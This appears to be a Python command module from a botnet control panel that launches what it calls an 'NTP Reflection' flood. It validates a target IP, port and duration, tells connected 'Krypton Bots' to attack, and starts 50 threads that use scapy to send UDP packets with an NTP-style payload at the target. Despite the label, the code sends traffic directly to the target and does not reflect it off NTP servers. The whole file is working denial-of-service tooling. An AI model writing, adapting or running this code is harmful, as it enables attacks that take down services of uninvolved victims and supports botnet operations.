from colorama import Fore
import threading
import time
import random
from scapy.all import IP, UDP, Raw, send

ntp_payload = "\x17\x00\x03\x2a" + "\x00" * 4

def send_ntp(ip, port, duration):
    end_time = time.time() + int(duration)
    while time.time() < end_time:
        # Create the NTP packet
        packet = IP(dst=ip) / UDP(dport=int(port)) / Raw(load=ntp_payload)
        try:
            send(packet, verbose=False)
        except Exception as e:
            print(f"Error sending NTP packet: {e}")

def ntp(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, broadcast, data):
    if len(args) == 4:
        ip = args[1]
        port = args[2]
        secs = args[3]

        info_message = '''%s============= (%sTARGET%s) ==============
            %s  IP:%s %s
            %sPORT:%s %s
            %sTIME:%s %s
          %sMETHOD:%s %s''' % (Fore.LIGHTBLACK_EX, Fore.GREEN, Fore.LIGHTBLACK_EX, Fore.CYAN, Fore.LIGHTWHITE_EX, ip, Fore.CYAN, Fore.LIGHTWHITE_EX, port, Fore.CYAN, Fore.LIGHTWHITE_EX, secs, Fore.CYAN, Fore.LIGHTWHITE_EX, 'NTP Reflection')

        if validate_ip(ip):
            if validate_port(port):
                if validate_time(secs):
                    for x in info_message.split('\n'):
                        send(client, '\x1b[3;31;40m' + x)
                    send(client, f" {Fore.LIGHTBLACK_EX}\nAttack {Fore.LIGHTGREEN_EX}successfully{Fore.LIGHTBLACK_EX} sent to all Krypton Bots!\n")
                    broadcast(data)

                    # Launch multiple threads for NTP reflection attack
                    thread_count = 50
                    for _ in range(thread_count):
                        ntp_thread = threading.Thread(target=send_ntp, args=(ip, port, secs))
                        ntp_thread.start()

                else:
                    send(client, Fore.RED + '\nInvalid attack duration (10-1300 seconds)\n')
            else:
                send(client, Fore.RED + '\nInvalid port number (1-65535)\n')
        else:
            send(client, Fore.RED + '\nInvalid IP-address\n')
    else:
        send(client, f'\nUsage: {Fore.LIGHTBLACK_EX}.ntp [IP] [PORT] [TIME]\n')
